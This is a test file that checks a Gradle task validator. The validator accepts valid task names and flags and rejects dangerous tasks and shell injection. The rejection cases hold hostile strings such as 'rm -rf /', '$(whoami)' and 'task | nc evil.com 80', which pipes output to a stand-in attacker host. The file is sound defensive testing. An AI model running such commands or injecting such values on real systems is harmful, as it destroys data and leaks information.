import { describe, it, expect } from 'vitest';
import { GradleTaskValidator } from '../src/infrastructure/build/GradleTaskValidator.js';
import { SecurityError } from '../src/config/errors.js';

describe('GradleTaskValidator.task', () => {
  it.each(['assembleDebug', 'test', ':app:assembleDebug', ':modules:feature:appointment:test'])(
    'accepts %s',
    (task) => {
      expect(GradleTaskValidator.task(task)).toBe(task);
    },
  );

  it.each([
    'rm -rf /',
    'task; whoami',
    '`id`',
    'task | nc evil.com 80',
    'task && evil',
    '',
  ])('rejects %s', (task) => {
    expect(() => GradleTaskValidator.task(task)).toThrow(SecurityError);
  });

  it.each(['publishToMavenLocal', ':app:publishApiPublication', 'uninstallAll', 'releaseDeploy'])(
    'rejects dangerous task %s',
    (task) => {
      expect(() => GradleTaskValidator.task(task)).toThrow(SecurityError);
    },
  );

  it('does not flag assembleRelease as dangerous', () => {
    expect(GradleTaskValidator.task('assembleRelease')).toBe('assembleRelease');
  });
});

describe('GradleTaskValidator.extraArgs', () => {
  it('accepts whitelisted-character flags', () => {
    expect(GradleTaskValidator.extraArgs(['-PenvName=staging', '-x', 'lint'])).toEqual([
      '-PenvName=staging',
      '-x',
      'lint',
    ]);
  });

  it('rejects shell metacharacters', () => {
    expect(() => GradleTaskValidator.extraArgs(['; rm -rf /'])).toThrow(SecurityError);
    expect(() => GradleTaskValidator.extraArgs(['$(whoami)'])).toThrow(SecurityError);
  });
});
